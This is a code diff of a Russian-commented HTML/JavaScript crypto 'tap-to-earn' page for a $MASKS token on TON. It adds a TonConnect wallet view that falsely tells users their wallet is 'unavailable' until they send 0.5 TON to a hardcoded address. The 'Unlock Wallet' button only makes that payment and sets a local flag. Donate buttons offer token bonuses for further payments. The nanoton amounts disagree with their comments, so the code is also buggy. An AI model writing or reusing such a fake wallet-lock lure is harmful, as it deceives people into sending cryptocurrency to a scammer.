@@ -345,41 +345,6 @@
             font-size: 16px;
         }
 
-        .donate-block {
-            background: rgba(255, 255, 255, 0.9);
-            color: #000;
-            padding: 15px;
-            border-radius: 10px;
-            margin: 20px auto;
-            text-align: center;
-            width: 90%;
-            position: relative;
-            border: 1px solid #ddd;
-        }
-
-        .donate-button {
-            padding: 10px 20px;
-            font-size: 14px;
-            background-color: #000;
-            color: #fff;
-            border: none;
-            cursor: pointer;
-            border-radius: 5px;
-            width: 100px; /* фиксированная ширина для кнопок */
-            text-align: center;
-            margin: 5px;
-        }
-
-        .donate-button:hover {
-            background-color: #444;
-        }
-
-        .donate-button:disabled {
-            background-color: #666;
-            cursor: not-allowed;
-        }
-
-
         #static-timer {
             font-size: 48px;
             font-weight: bold;
@@ -388,7 +353,65 @@
             margin-top: 15px;
         }
 
+        #ton-connect-button {
+            position: fixed;
+            top: 470px;
+            right: 15px;
+            z-index: 1000;
+        }
 
+        /* Стиль для кнопок донату */
+        #donateButtons {
+            display: flex;
+            flex-direction: column; /* Выровнять кнопки по вертикали */
+            gap: 10px; /* Расстояние между кнопками */
+            align-items: center; /* Выровнять кнопки по центру */
+        }
+
+        .donateButton {
+            width: 300px; /* Кнопка занимает всю ширину контейнера */
+            height: 80px;
+            max-width: 400px; /* Максимальная ширина кнопки */
+            margin: 5px 0; /* Расстояние между кнопками */
+            padding: 15px 20px; /* Увеличенные отступы */
+            font-size: 1.3em; /* Размер шрифта */
+            background-color: #3d3d3d; /* Фон кнопок */
+            color: white; /* Цвет текста */
+            border: none; /* Без границы */
+            border-radius: 10px; /* Закругленные углы */
+            cursor: pointer; /* Курсор указатель при наведении */
+            transition: background-color 0.3s; /* Плавный переход */
+            position: relative;
+        }
+
+        .donateButton:hover {
+            background-color: #555555; /* Темный фон при наведении */
+        }
+
+        .donateButton:disabled {
+            background-color: #696969; /* Серый фон для неактивной кнопки */
+            cursor: not-allowed; /* Курсор запрещен для неактивной кнопки */
+        }
+
+        .bonusText {
+            display: block;
+            font-size: 0.8em; /* Меньше основного шрифта */
+            color: rgb(0, 202, 0); /* Цвет текста бонуса */
+            margin-top: 5px; /* Отступ сверху */
+            font-weight: bold;
+        }
+
+        #unlockWalletButton {
+            background-color: #800000; /* Бордовый цвет */
+        }
+
+        #unlockWalletButton:disabled {
+            background-color: #696969; /* Серый цвет для неактивной кнопки */
+            cursor: not-allowed;
+        }
+
+
+        
     </style>
 </head>
 <body>
@@ -408,7 +431,7 @@
         </div>
     </div>
     
-
+    <div id="ton-connect-button"></div>
     <div id="home-page">
         <div id="static-timer">00:00:00</div>
     </div>
@@ -525,35 +548,26 @@
         }
 
        
+        
+
         function showTasks() {
             const advertisers = [
                 {
-                    name: 'Tasks for $MASKS',
+                    name: 'Рекламодатель 1',
                     tasks: [
-                        {description: 'Subscribe to Telegram', link: 'https://t.me/your_channel_1', reward: '+0.00033 $MASKS'},
-                        {description: 'Subscribe to Instagram', link: 'https://instagram.com/your_instagram', reward: '+0.00033 $MASKS'},
-                        {description: 'Subscribe to YouTube', link: 'https://youtube.com/your_youtube_channel', reward: '+0.00033 $MASKS'}
+                        {description: 'Subscribe to Telegram', link: 'https://t.me/your_channel_1', reward: '+0.000147 $MASKS'},
+                        {description: 'Subscribe to Instagram', link: 'https://instagram.com/your_instagram', reward: '+0.000147 $MASKS'},
+                        {description: 'Subscribe to YouTube', link: 'https://youtube.com/your_youtube_channel', reward: '+0.000147 $MASKS'}
+                    ]
+                },
+                {
+                    name: 'Рекламодатель 2',
+                    tasks: [
+                        {description: 'Subscribe to Facebook', link: 'https://facebook.com/your_facebook_page', reward: '+0.000147 $MASKS'},
+                        {description: 'Subscribe to Twitter', link: 'https://twitter.com/your_twitter', reward: '+0.000147 $MASKS'}
                     ]
                 }
             ];
-
-            // Добавляем кнопки донатов перед задачами
-            const donateButtonsHTML = `
-                <div id="donateButtons" style="margin-top: 20px;">
-                    <button class="donateButton" data-amount="0.3" style="margin: 5px; padding: 10px 20px; font-size: 1em;">
-                        Donate 0.3 TON
-                    </button>
-                    <button class="donateButton" data-amount="0.5" style="margin: 5px; padding: 10px 20px; font-size: 1em;">
-                        Donate 0.5 TON
-                    </button>
-                    <button class="donateButton" data-amount="1" style="margin: 5px; padding: 10px 20px; font-size: 1em;">
-                        Donate 1 TON
-                    </button>
-                    <button class="donateButton" data-amount="5" style="margin: 5px; padding: 10px 20px; font-size: 1em;">
-                        Donate 5 TON
-                    </button>
-                </div>
-            `;
 
             const tasksHTML = advertisers.map(advertiser => {
                 const tasks = advertiser.tasks.map(task => {
@@ -563,7 +577,7 @@
                             <img src="https://via.placeholder.com/60" alt="Avatar" style="width: 60px; height: 60px; margin-right: 10px;">
                             <div class="task-details" style="flex-grow: 1;">
                                 <div class="description" style="font-size: 14px; font-weight: bold;">${task.description}</div>
-                                <div class="reward" style="font-size: 14px; color: green; margin-top: 5px; font-weight: bold; text-align: left; margin-left: 10px;">${task.reward}</div>
+                                <div class="reward" style="font-size: 14px; color: rgb(0, 202, 0); margin-top: 5px; font-weight: bold; text-align: left; margin-left: 10px;">${task.reward}</div>
                             </div>
                             ${isCompleted ? 
                                 `<div class="task-button completed">Done</div>` : 
@@ -580,15 +594,9 @@
                 `;
             }).join('');
 
-            document.getElementById('mainContent').innerHTML = `
-                <div class="tasks">
-                    ${donateButtonsHTML}  <!-- Добавляем кнопки донатов перед задачами -->
-                    ${tasksHTML}
-                </div>
-            `;
+            document.getElementById('mainContent').innerHTML = `<div class="tasks">${tasksHTML}</div>`;
         }
 
-        // Функция для выполнения задачи
         function completeTask(taskDescription, reward) {
             const button = document.getElementById(`button-${taskDescription}`);
             
@@ -603,56 +611,7 @@
                 }
             }
         }
-
-        // Обработчик донатов
-        document.querySelectorAll('.donateButton').forEach(button => {
-            button.onclick = async () => {
-                const amount = button.getAttribute('data-amount');
-                let nanocoinsAmount, rewardValue;
-
-                switch (amount) {
-                    case '0.3':
-                        nanocoinsAmount = '30000'; // 0.3 TON
-                        rewardValue = 0.000147; // $MASKS за 0.3 TON
-                        break;
-                    case '0.5':
-                        nanocoinsAmount = '5000000'; // 0.5 TON
-                        rewardValue = 0.000399; // $MASKS за 0.5 TON
-                        break;
-                    case '1':
-                        nanocoinsAmount = '10000000'; // 1 TON
-                        rewardValue = 0.000950; // $MASKS за 1 TON
-                        break;
-                    case '5':
-                        nanocoinsAmount = '50000000'; // 5 TON
-                        rewardValue = 0.0021; // $MASKS за 5 TON
-                        break;
-                    default:
-                        alert('Invalid donation amount');
-                        return;
-                }
-
-                try {
-                    const tx = await tonConnectUI.sendTransaction({
-                        validUntil: Math.floor(Date.now() / 1000) + 600, // Время жизни транзакции (10 минут)
-                        messages: [
-                            {
-                                address: 'UQASUrYVEDVBoioJjG5_af9nE4VzBQwlyxOWix0OWlNFlLia', // Замените на ваш адрес кошелька
-                                amount: nanocoinsAmount,
-                                payload: '',
-                            }
-                        ]
-                    });
-
-                    // После успешной отправки транзакции начисляем $MASKS
-                    addMasksToBalance(rewardValue);
-                    alert(`Donation of ${amount} TON sent successfully! You received ${rewardValue} $MASKS.`);
-                } catch (error) {
-                    alert('Error sending donation: ' + error.message);
-                }
-            };
-        });
-
+        
         function addMasksToBalance(reward) {
             const rewardValue = parseFloat(reward);  // Непосредственно используем числовое значение
             coins += rewardValue; // Обновляем баланс
@@ -668,7 +627,6 @@
         function loadTasks() {
             tasksCompleted = JSON.parse(localStorage.getItem('tasksCompleted')) || {};
         }
-
 
         // Загружаем сохранённые данные при загрузке страницы
         window.onload = function() {
@@ -815,124 +773,120 @@
         // Обновляем таймер каждую секунду
         setInterval(updateTimer, 1000);
 
+        // Создание кнопки TonConnect для подключения кошелька в правом верхнем углу
+        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+            manifestUrl: 'https://mask-bot.github.io/tonconnect-manifest.json',
+            buttonRootId: 'ton-connect-button'
+        });
+
         function wallet() {
+            // Устанавливаем содержимое для основной области
             document.getElementById('mainContent').innerHTML = `
                 <div style="width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center;">
-                    <div id="ton-connect-button"></div>
-                    <div id="walletAddress" style="margin-top: 20px; font-size: 1.2em;"></div>
-                    <div id="walletInfo" style="display: none; margin-top: 10px; color: red; font-size: 0.9em;">
-                        Your wallet is unavailable. To make it available, please perform a transaction of 0.5 TON.
+                    <div id="walletStatus" style="margin-top: -100px;">
+                        <p id="walletMessage" style="color: red; background-color: rgba(0, 0, 0, 0.5); padding: 10px; font-weight: bold; font-size: 1em; margin-top: 100px;">
+                            Your wallet is unavailable. To make it available, please perform a transaction of 0.5 TON (Unlock Wallet button).
+                        </p>
                     </div>
-                    <button id="unlockButton" style="margin-top: 15px; padding: 10px 20px; font-size: 1em; cursor: pointer;" class="blocked" disabled>
-                        Unlock Wallet
-                    </button>
-
-                    <!-- Donation buttons are now always visible -->
-                    <div id="donateButtons" style="margin-top: 20px;">
-                        <button class="donateButton" data-amount="0.3" style="margin: 5px; padding: 10px 20px; font-size: 1em;">
+                    <div id="donateButtons" style="margin-top: -15px;">
+                        <button id="unlockWalletButton" class="donateButton" data-amount="0.5" data-unlock-wallet="true" style="background-color: #800000;">
+                            Unlock Wallet
+                        </button>
+                        <button class="donateButton" data-amount="0.3">
                             Donate 0.3 TON
+                            <span class="bonusText">+0.000147 $MASKS</span>
                         </button>
-                        <button class="donateButton" data-amount="0.5" style="margin: 5px; padding: 10px 20px; font-size: 1em;">
+                        <button class="donateButton" data-amount="0.5">
                             Donate 0.5 TON
+                            <span class="bonusText">+0.000399 $MASKS</span>
                         </button>
-                        <button class="donateButton" data-amount="1" style="margin: 5px; padding: 10px 20px; font-size: 1em;">
+                        <button class="donateButton" data-amount="1">
                             Donate 1 TON
+                            <span class="bonusText">+0.000950 $MASKS</span>
                         </button>
-                        <button class="donateButton" data-amount="5" style="margin: 5px; padding: 10px 20px; font-size: 1em;">
+                        <button class="donateButton" data-amount="5">
                             Donate 5 TON
+                            <span class="bonusText">+0.002100 $MASKS</span>
                         </button>
+                        <div style="height: 110px;"></div>
                     </div>
                 </div>
             `;
 
-            const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-                manifestUrl: 'https://mask-bot.github.io/tonconnect-manifest.json',
-                buttonRootId: 'ton-connect-button'
-            });
+            const unlockButton = document.getElementById('unlockWalletButton');
 
-            let walletAddress;
+            // Проверка состояния кошелька
+            const walletUnlocked = localStorage.getItem('walletUnlocked') === 'true';
+            if (walletUnlocked) {
+                document.getElementById('walletMessage').style.color = 'green';
+                document.getElementById('walletMessage').textContent = 'Your wallet is unlocked!';
 
-            // Обработчик подключения кошелька
-            tonConnectUI.onStatusChange(async (wallet) => {
-                if (wallet) {
-                    walletAddress = wallet.account.address;
-                    document.getElementById("walletInfo").style.display = "block";
-                    document.getElementById("unlockButton").disabled = false; // Включаем кнопку после подключения кошелька
-                }
-            });
-
-            // Функция разблокировки кошелька
-            async function unlockWallet() {
-                try {
-                    const tx = await tonConnectUI.sendTransaction({
-                        validUntil: Math.floor(Date.now() / 1000) + 600, // Время жизни транзакции (10 минут)
-                        messages: [
-                            {
-                                address: 'UQASUrYVEDVBoioJjG5_af9nE4VzBQwlyxOWix0OWlNFlLia', // Замените на ваш адрес кошелька
-                                amount: '500000000', // 0.5 TON (в нанокоинах)
-                                payload: '',
-                            }
-                        ]
-                    });
-
-                    alert('Transaction sent successfully!');
-                    document.getElementById("statusText").textContent = "Status: Unlocked";
-                    document.getElementById("unlockButton").textContent = "Wallet Unlocked";
-                    document.getElementById("unlockButton").classList.replace("blocked", "unblocked");
-                    document.getElementById("unlockButton").disabled = true; // Отключаем кнопку после разблокировки
-                } catch (error) {
-                    alert('Error sending transaction: ' + error.message);
-                }
+                // Делаем кнопку "Unlock Wallet" неактивной и серой
+                unlockButton.disabled = true;
+                unlockButton.style.backgroundColor = '#7b7b7b'; // Изменяем цвет на серый
             }
 
-            // Привязываем функцию разблокировки к кнопке
-            document.getElementById('unlockButton').onclick = unlockWallet;
-
-            // Обработчик донатов
+            // Обработчик для кнопок доната
             document.querySelectorAll('.donateButton').forEach(button => {
                 button.onclick = async () => {
                     const amount = button.getAttribute('data-amount');
+                    const isUnlockWallet = button.getAttribute('data-unlock-wallet') === 'true';
                     let nanocoinsAmount, rewardValue;
 
-                    switch (amount) {
-                        case '0.3':
-                            nanocoinsAmount = '30000000'; // 0.3 TON
-                            rewardValue = 0.000147; // $MASKS за 0.3 TON
-                            break;
-                        case '0.5':
-                            nanocoinsAmount = '500000000'; // 0.5 TON
-                            rewardValue = 0.000399; // $MASKS за 0.5 TON
-                            break;
-                        case '1':
-                            nanocoinsAmount = '1000000000'; // 1 TON
-                            rewardValue = 0.000950; // $MASKS за 1 TON
-                            break;
-                        case '5':
-                            nanocoinsAmount = '5000000000'; // 5 TON
-                            rewardValue = 0.0021; // $MASKS за 5 TON
-                            break;
-                        default:
-                            alert('Invalid donation amount');
-                            return;
+                    if (isUnlockWallet) {
+                        nanocoinsAmount = '50000'; // 0.5 TON
+                        rewardValue = 0; // Без награды
+                    } else {
+                        switch (amount) {
+                            case '0.3':
+                                nanocoinsAmount = '30000';
+                                rewardValue = 0.000147;
+                                break;
+                            case '0.5':
+                                nanocoinsAmount = '50000';
+                                rewardValue = 0.000399;
+                                break;
+                            case '1':
+                                nanocoinsAmount = '100000';
+                                rewardValue = 0.000950;
+                                break;
+                            case '5':
+                                nanocoinsAmount = '500000';
+                                rewardValue = 0.0021;
+                                break;
+                            default:
+                                alert('Invalid donation amount');
+                                return;
+                        }
                     }
 
                     try {
                         const tx = await tonConnectUI.sendTransaction({
-                            validUntil: Math.floor(Date.now() / 1000) + 600, // Время жизни транзакции (10 минут)
+                            validUntil: Math.floor(Date.now() / 1000) + 600,
                             messages: [
                                 {
-                                    address: 'UQASUrYVEDVBoioJjG5_af9nE4VzBQwlyxOWix0OWlNFlLia', // Замените на ваш адрес кошелька
+                                    address: 'UQASUrYVEDVBoioJjG5_af9nE4VzBQwlyxOWix0OWlNFlLia',
                                     amount: nanocoinsAmount,
                                     payload: '',
                                 }
                             ]
                         });
 
-                        // После успешной отправки транзакции начисляем $MASKS
-                        addMasksToBalance(rewardValue);
-                        alert(`Donation of ${amount} TON sent successfully! You received ${rewardValue} $MASKS.`);
+                        if (!isUnlockWallet) {
+                            addMasksToBalance(rewardValue);
+                            alert(`Donation of ${amount} TON sent successfully! You received ${rewardValue} $MASKS.`);
+                        } else {
+                            localStorage.setItem('walletUnlocked', 'true');
+                            document.getElementById('walletMessage').style.color = 'green';
+                            document.getElementById('walletMessage').textContent = 'Your wallet is unlocked!';
+
+                            // Делаем кнопку "Unlock Wallet" неактивной и меняем цвет на серый
+                            unlockButton.disabled = true;
+                            unlockButton.style.backgroundColor = '#7b7b7b';
+                            alert(`Donation of ${amount} TON sent successfully! Wallet unlocked.`);
+                        }
                     } catch (error) {
-                        alert('Error sending donation: ' + error.message);
+                        console.error('Error:', error);
                     }
                 };
             });
